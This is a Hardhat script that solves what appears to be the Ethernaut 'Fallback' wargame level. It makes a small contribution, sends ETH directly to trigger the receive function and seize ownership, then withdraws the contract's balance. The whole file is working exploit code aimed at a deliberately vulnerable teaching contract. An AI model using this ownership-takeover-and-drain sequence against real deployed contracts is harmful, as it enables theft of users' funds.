const { getNamedAccounts, ethers, network } = require("hardhat")
const {
    developmentChains,
    networkConfig,
    STANDARD_FEE_VALUE,
} = require("../helper-hardhat-config")

/**
 * The first objective is to sucessfully call the receive function
 * so that we are the new owners of the contract.
 * The second objective is to successfully call the withdraw function
 */

async function performHack() {
    const { deployer, player } = await getNamedAccounts()
    console.log("-------------------------------------")
    console.log("Retrieving fallback contract and hacker address...")
    let fallbackContract, hacker
    const chainId = network.config.chainId
    if (developmentChains.includes(network.name)) {
        hacker = player
        fallbackContract = await ethers.getContract("Fallback", hacker)
    } else {
        hacker = deployer
        fallbackContract = await ethers.getContractAt(
            "Fallback",
            networkConfig[chainId]["fallbackContractAddress"],
            hacker
        )
    }
    console.log("Done!")
    console.log("-------------------------------------")
    console.log("Showing initial information...")
    await showInitialInformation(fallbackContract)
    console.log("-------------------------------------")
    console.log(
        "Step 1: Making the contributions[msg.sender] > 0 condition true..."
    )
    await callContributeFunction(fallbackContract)
    console.log("-------------------------------------")
    console.log("Step 2: Calling the receive function...")
    await callReceiveFunction(fallbackContract, hacker)
    console.log("-------------------------------------")
    console.log("Step 3: Calling the withdraw function...")
    await callWithdrawFunction(fallbackContract, hacker)
}

async function showInitialInformation(fallbackContract) {
    console.log(`Contract owner is ${await fallbackContract.owner()}`)
    console.log(
        `Contract balance is ${ethers.utils.formatEther(
            await ethers.provider.getBalance(fallbackContract.address)
        )} ETH`
    )
    console.log(`User is ${await fallbackContract.signer.address}`)
    console.log(`User balance is ${await fallbackContract.getContribution()}`)
}

async function callContributeFunction(fallbackContract) {
    const contributeTx = await fallbackContract.contribute({
        value: STANDARD_FEE_VALUE,
    })
    await contributeTx.wait(1)
    console.log(
        `Contract balance is now ${ethers.utils.formatEther(
            await ethers.provider.getBalance(fallbackContract.address)
        )} ETH`
    )
    console.log(
        `User balance is now ${ethers.utils.formatEther(
            await fallbackContract.getContribution()
        )} ETH`
    )
}

async function callReceiveFunction(fallbackContract, hacker) {
    const hackerSigner = await ethers.getSigner(hacker)
    receiveTx = await hackerSigner.sendTransaction({
        to: fallbackContract.address,
        value: STANDARD_FEE_VALUE,
    })
    await receiveTx.wait(1)
    console.log(`Contract owner is now ${await fallbackContract.owner()}`)
}

async function callWithdrawFunction(fallbackContract, hacker) {
    console.log(
        `Contract balance before withdraw is ${ethers.utils.formatEther(
            await ethers.provider.getBalance(fallbackContract.address)
        )} ETH`
    )
    console.log(
        `User balance after withdraw is ${ethers.utils.formatEther(
            await ethers.provider.getBalance(hacker)
        )} ETH`
    )
    const withdrawTx = await fallbackContract.withdraw()
    await withdrawTx.wait(1)
    console.log(
        `Contract balance after withdraw is ${ethers.utils.formatEther(
            await ethers.provider.getBalance(fallbackContract.address)
        )} ETH`
    )
    console.log(
        `User balance after withdraw is ${ethers.utils.formatEther(
            await ethers.provider.getBalance(hacker)
        )} ETH`
    )
}

performHack()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        process.exit(1)
    })
